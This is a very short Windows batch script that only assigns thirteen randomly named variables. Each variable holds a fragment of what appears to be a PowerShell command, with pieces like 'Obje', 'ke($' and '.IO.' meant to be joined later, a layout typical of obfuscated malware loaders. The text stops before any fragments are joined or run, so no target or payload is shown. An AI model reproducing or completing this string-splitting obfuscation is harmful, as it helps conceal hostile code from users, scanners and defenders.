@echo off
set "qLzdQtVLSI=eMVs"
set "NVhIEoMrnT=)))"
set "YDuuFkClEB=fore"
set "byGRgbebuf=Obje"
set "SNubiogNDK=ke($"
set "oRggQaynoy=y = "
set "EiYrOmgmgR=nirt"
set "tZwgTvBxRw=fWP."
set "MnsjiKDesC=.IO."
set "fkjYnYkRXZ=;$cM"
set "tlWzTVDNAd= '')"
set "ceIhimsJOu=();$"
set "SwYaPiCPiu=$cMf"
